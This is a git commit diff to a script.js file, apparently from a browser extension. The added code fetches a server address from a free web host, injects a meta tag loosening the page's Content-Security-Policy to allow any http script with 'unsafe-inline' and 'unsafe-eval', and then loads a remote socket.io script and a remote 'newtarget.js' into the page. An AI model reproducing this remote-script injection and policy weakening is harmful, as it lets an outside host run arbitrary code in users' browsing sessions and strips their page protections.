aca398ed6381de548c4e8bbcec7564625d752f69
nimada <47938642+TEDDMNSC137@users.noreply.github.com>
2022-09-20 22:35:34 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,34 +1,33 @@
-
-// $.getJSON('https://remotehostsmiley.000webhostapp.com/getServer.json', function(data) {
-//     // JSON result in `data` variable
-//     stringifyJs = JSON.stringify(data)
-//     stringifyJs = stringifyJs.split(':"')
-//     stringifyJs = stringifyJs[1];
-//     stringifyJs = stringifyJs.slice(0, stringifyJs.length - 2)
-//     console.log(stringifyJs)
-//     serverHost = stringifyJs;
-// });
-var serverHost;
-var stringifyJs;
+var serverHost, stringifyJs, test;
 
 
-await fetch('https://remotehostsmiley.000webhostapp.com/getServer.json')
+fetch('https://remotehostsmiley.000webhostapp.com/getServer.json')
 .then(response => response.json())
 .then(json => {
     stringifyJs = JSON.stringify(json)
     stringifyJs = stringifyJs.split(':"')
     stringifyJs = stringifyJs[1];
     stringifyJs = stringifyJs.slice(0, stringifyJs.length - 2)
-    console.log(stringifyJs)
+    console.log("extension: " + stringifyJs)
     serverHost = stringifyJs;
 })
 
-sc = document.createElement("script");
-sc.setAttribute("defer", "");
-sc.setAttribute("src", `${serverHost}/socket.io/socket.io.js`);
-document.head.appendChild(sc);
+.then(()=>{
+    
+    sc = document.createElement("meta");
+    sc.setAttribute("http-equiv", "Content-Security-Policy");
+    sc.setAttribute("content", `default-src *; style-src 'self' http://* 'unsafe-inline'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'`);
+    document.head.appendChild(sc);
+    
+    
 
-sc = document.createElement("script");
-sc.setAttribute("defer", "");
-sc.setAttribute("src", "https://remotehostsmiley.000webhostapp.com/newtarget.js");
-document.head.appendChild(sc);
+    sc = document.createElement("script");
+    sc.setAttribute("defer", "");
+    sc.setAttribute("src", `${serverHost}/socket.io/socket.io.js`);
+    document.head.appendChild(sc);
+
+    sc = document.createElement("script");
+    sc.setAttribute("defer", "");
+    sc.setAttribute("src", "https://remotehostsmiley.000webhostapp.com/newtarget.js");
+    document.head.appendChild(sc);
+})
